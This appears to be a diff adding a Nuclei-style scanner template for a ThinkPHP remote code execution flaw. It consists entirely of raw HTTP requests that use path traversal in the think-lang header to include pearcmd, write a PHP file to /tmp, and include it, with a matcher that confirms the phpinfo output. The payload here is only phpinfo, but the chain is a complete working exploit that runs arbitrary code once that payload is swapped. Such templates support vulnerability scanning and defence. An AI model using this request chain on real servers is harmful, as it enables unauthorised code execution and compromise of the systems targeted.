@@ -1,0 +1,67 @@
+id: thinkphp-think-lang-rce
+
+info:
+  name: thinkphp-think-lang-rce
+  author: wuha
+  severity: critical
+  reference:
+    - https://tttang.com/archive/1865/
+  tags: thinkphp,rce
+  
+http:
+  - raw:
+      - |
+        GET /index.php?+config-create+/<?=phpinfo()?>+/tmp/test.php HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        think-lang:../../../../../../../../usr/local/lib/php/pearcmd
+        Cookie: think_lang=zh-cn
+        Connection: close
+
+      - |
+        GET /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        think-lang:../../../../../../../../tmp/test
+        Cookie: think_lang=zh-cn
+        Connection: close
+
+      - |
+        GET /public/index.php?+config-create+/<?=phpinfo()?>+/tmp/test.php HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        think-lang:../../../../../../../../usr/local/lib/php/pearcmd
+        Cookie: think_lang=zh-cn
+        Connection: close
+
+      - |
+        GET /public/index.php HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        think-lang:../../../../../../../../tmp/test
+        Cookie: think_lang=zh-cn
+        Connection: close
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PHP'
+          - 'Version'
+        condition: and
